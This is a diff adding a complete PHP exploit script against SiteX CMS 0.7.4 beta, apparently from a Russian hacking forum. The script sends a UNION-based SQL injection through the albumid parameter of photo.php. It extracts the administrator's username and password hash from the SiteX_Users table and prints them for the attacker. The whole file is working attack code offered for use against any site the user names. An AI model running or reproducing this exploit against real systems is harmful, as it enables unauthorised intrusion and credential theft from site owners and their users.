@@ -1,0 +1,34 @@
+<?php
+echo "\n\n###########################################################################\n";
+echo "##                                                                       ##\n";
+echo "##   Product: SiteX CMS 0.7.4 beta (/photo.php) SQL-Injection exploit    ##\n";
+echo "##   Usage: php.exe sitex.php www.site.com /cmspath/                     ##\n";
+echo "##   Require: Magic_quotes = off                                         ##\n";
+echo "##   Author: Sc0rpi0n [RUS] (http://scorpion.su)                         ##\n";
+echo "##   Special for Antichat (forum.antichat.ru)                            ##\n";
+echo "##   Bugs find: Iceangel_, [x60]unu, .:[melkiy]:.                        ##\n";
+echo "##                                                                       ##\n";
+echo "###########################################################################\n\n";
+$host=$argv[1];
+$path=$argv[2];
+$script="photo.php?albumid=";
+$sql=urlencode("-1' UNION SELECT 1,concat(0x3a3a,username,0x3a3a3a,password,0x3a3a3a3a),3,4,5,6,7,8 FROM SiteX_Users WHERE id=1 -- ");
+$fsock=fsockopen($host,80);
+$headers="GET http://$host$path$script$sql HTTP/1.0\r\n";
+$headers.="Host: $host\r\n\r\n";
+fwrite($fsock,$headers);
+while(!feof($fsock))
+        $response.=fread($fsock,1024);
+$pos1=strpos($response,"::") or die("## http://$host is not vulnerable or error\n");
+$pos2=strpos($response,":::") or die("## http://$host is not vulnerable or error\n");
+$pos3=strpos($response,"::::") or die("## http://$host is not vulnerable or error\n");
+$len1=$pos2-$pos1;
+$len2=$pos3-$pos2;
+
+$login=substr($response,$pos1+2,$len1-2);
+$password=substr($response,$pos2+3,$len2-3);
+
+echo "## Host: $argv[1]\n";
+echo "## Login: $login\n";
+echo "## Password: $password\n";
+?>
